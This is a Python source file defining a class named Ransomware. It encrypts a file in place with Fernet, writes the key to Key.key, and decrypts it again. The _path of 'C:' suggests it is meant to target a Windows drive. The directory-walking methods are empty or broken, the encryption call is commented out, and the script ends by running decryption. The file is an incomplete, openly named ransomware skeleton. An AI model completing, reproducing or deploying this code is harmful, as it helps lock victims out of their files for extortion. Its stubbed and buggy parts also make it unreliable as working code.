import os
from cryptography.fernet import Fernet
from Constants.Messages import Messages
from Core.Tools.ProgramHelper import ProgramHelper
from Core.Tools.FileHelper import FileHelper
from Core.Utilities.Results.DataResult import DataResult
from Core.Utilities.Results.IDataResult import IDataResult
from Core.Utilities.Results.SuccessDataResult import SuccessDataResult
from Core.Utilities.Results.ErrorDataResult import ErrorDataResult

class Ransomware:
    _path:str = 'C:'

    def __init__(self) -> None:
        pass

    def EncryptFile(self,directories:list):
        for directory in directories:
            for file in directory:
                pass

    def GetFiles(self,path):
        files = list()
        if os.path.isdir(path):
            files.append(path)
        return path

    def Decrypt(self,filename:str,key:bytes) -> IDataResult:
        exists = ProgramHelper.FileExists(filename)
        if not exists:
            return ErrorDataResult(message='File not found')
        fernet = Fernet(key)
        context = FileHelper.Reader(filename)
        if context.Success:
            decrypt = fernet.decrypt(context.Data)
            FileHelper.Writer(filename,decrypt)
            return SuccessDataResult(message = Messages.decryptionSuccess)
        else:
            return ErrorDataResult(message = context.Message)
    
    def Encrypt(self,file:str) -> IDataResult:
        try:
            fernet = Fernet(self.GenerateKey())
            read = FileHelper.Reader(file)
            if read.Success:
                encryptData = fernet.encrypt(read.Data)
                write = FileHelper.Writer(file,encryptData)
                if write.Success:
                    return SuccessDataResult(message = Messages.encryptionSuccess)
            else:
                return ErrorDataResult(message = read.Message)

        except Exception as e:
            return ErrorDataResult(message=e)    
        return SuccessDataResult(message=Messages.encryptionSuccess)
    @staticmethod
    def GenerateKey() -> bytes:
        key = Fernet.generate_key()
        FileHelper.Writer(filename='Key.key',context=key)
        return key


ransomware = Ransomware()
#encrypt:bool = ransomware.Encrypt('encrypt')
#if encrypt:
    # print(encrypt.Message)


with open('Key.key','rb') as file:
    decrypt:bool = ransomware.Decrypt('encrypt',file.read())
